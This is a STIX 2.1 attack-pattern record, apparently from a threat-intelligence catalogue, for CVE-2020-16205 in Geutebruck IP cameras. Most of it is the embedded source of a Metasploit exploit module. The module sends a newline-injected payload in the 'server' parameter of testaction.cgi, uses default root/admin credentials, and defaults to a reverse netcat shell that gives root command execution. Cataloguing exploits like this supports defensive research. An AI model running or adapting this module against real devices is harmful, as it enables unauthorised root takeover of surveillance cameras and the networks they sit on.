{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--773d7432-73e4-47f5-a340-3f24cfa0d025",
    "created": "2024-08-14T17:04:00.299534Z",
    "modified": "2024-08-14T17:04:00.299538Z",
    "name": "Geutebruck testaction.cgi Remote Command Execution",
    "description": " This module exploits an authenticated arbitrary command execution vulnerability within the 'server' GET parameter of the /uapi-cgi/testaction.cgi page of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.25 as well as firmware versions 1.12.13.2 and 1.12.14.5 when the 'type' GET paramter is set to 'ntp'. Successful exploitation results in remote code execution as the root user.  ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/geutebruck_testaction_exec.rb",
            "external_id": "geutebruck_testaction_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-16205"
        },
        {
            "source_name": "reference",
            "url": "http://geutebruck.com"
        },
        {
            "source_name": "reference",
            "url": "https://ics-cert.us-cert.gov/advisories/icsa-20-219-03"
        },
        {
            "source_name": "reference",
            "url": "https://www.randorisec.fr/s05e01-rce-on-geutebruck-ip-cameras/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Geutebruck testaction.cgi Remote Command Execution',\n        'Description' => %q{\n          This module exploits an authenticated arbitrary command execution vulnerability within the 'server'\n          GET parameter of the /uapi-cgi/testaction.cgi page of Geutebruck G-Cam EEC-2xxx and G-Code EBC-21xx, EFD-22xx,\n          ETHC-22xx, and EWPC-22xx devices running firmware versions <= 1.12.0.25 as well as firmware\n          versions 1.12.13.2 and 1.12.14.5 when the 'type' GET paramter is set to 'ntp'.\n          Successful exploitation results in remote code execution as the root user.\n        },\n\n        'Author' => [\n          'Davy Douhine' # ddouhine\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2020-16205' ],\n          [ 'URL', 'http://geutebruck.com' ],\n          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/icsa-20-219-03' ],\n          [ 'URL', 'https://www.randorisec.fr/s05e01-rce-on-geutebruck-ip-cameras/' ]\n        ],\n        'DisclosureDate' => '2020-05-20',\n        'Privileged' => true,\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_ARMLE],\n        'Targets' => [\n          [ 'Automatic Target', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_netcat_gaping'\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('HttpUsername', [ true, 'The username to authenticate as', 'root' ]),\n        OptString.new('HttpPassword', [ true, 'The password for the specified username', 'admin' ]),\n        OptString.new('TARGETURI', [true, 'The path to the testaction page', '/uapi-cgi/admin/testaction.cgi']),\n      ]\n    )\n  end\n\n  def firmware\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/brand.xml'\n    )\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    res_xml = res.get_xml_document\n    @version = res_xml.at('//firmware').text\n    return true\n  end\n\n  def check\n    result = firmware\n    return result unless result == true\n\n    version = Rex::Version.new(@version)\n    vprint_status \"Found Geutebruck version #{version}\"\n    if version < Rex::Version.new('1.12.0.25') || version == Rex::Version.new('1.12.13.2') || version == Rex::Version.new('1.12.14.5')\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"#{rhost}:#{rport} - Attempting to exploit...\")\n    send_request_cgi(\n      {\n        'method' => 'GET',\n        'uri' => target_uri.path,\n        'vars_get' => { 'type' => 'ntp', 'server' => \"\\n#{payload.encoded}\" }\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-05-20",
    "x_mitre_platforms": [
        "['unix', 'linux']"
    ]
}